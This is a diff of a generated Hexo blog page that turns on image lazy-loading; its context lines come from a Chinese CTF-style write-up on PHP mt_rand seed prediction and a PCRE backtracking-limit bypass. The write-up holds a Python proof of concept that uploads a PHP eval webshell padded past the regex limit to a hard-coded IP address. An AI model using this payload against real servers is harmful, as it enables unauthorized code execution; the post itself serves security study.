@@ -21,7 +21,7 @@
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/batman.jpeg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/batman.jpeg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
     KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
   </script>
 <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
@@ -262,7 +262,12 @@
 <p>mt_rand()伪随机漏洞</p>
 </blockquote>
 <p>对于php的mt_rand产生的随机数实际上是受mt_srand种子(seed)所影响的</p>
-<p><img src="/images/image-20210804153627316.png" alt="image-20210804153627316"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20210804153627316.png"
+                      alt="image-20210804153627316"
+                ></p>
 <p>会产生这样存在线性关系的随机数，可以同通过脚本暴力破解</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;2BnGu1TiNa&#x27;</span>b = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>res = <span class="string">&#x27;&#x27;</span><span class="comment"># print(len(b))for i in range(len(a)):    for j in range(len(b)):        if a[i] == b[j]:            res += str(j)+&#x27; &#x27;+str(j)+&#x27; 0 &#x27;+str(len(b))+&#x27; &#x27;            breakprint(res)#得到每个字符位于的位置，然后通过这种傻逼的组合方式</span></span><br></pre></td></tr></table></figure>
 
@@ -278,7 +283,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>function is_php(<span class="variable">$data</span>)&#123;      <span class="keyword">return</span> preg_match(<span class="string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="variable">$data</span>);  &#125;<span class="keyword">if</span>(!is_php(<span class="variable">$input</span>)) &#123;    fwrite(<span class="variable">$f</span>, <span class="variable">$input</span>); ...&#125;在is_php为<span class="literal">false</span>的时候可以写入webshell</span><br></pre></td></tr></table></figure>
 
 <p>在正则函数匹配的时候会进行以下操作</p>
-<p><img src="/images/pcre%E5%9B%9E%E6%BA%AF.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/pcre%E5%9B%9E%E6%BA%AF.png"
+                     
+                ></p>
 <p>官方给出的回溯上限为1000000次，若是超出这个次数就会返回false</p>
 <p>所以可以给出对应的poc</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsfiles = &#123;  <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">1000000</span>)&#125;res = requests.post(<span class="string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="literal">False</span>)<span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure>
@@ -589,6 +599,8 @@
     <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
 
 
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
 
 
 <div class="post-scripts">
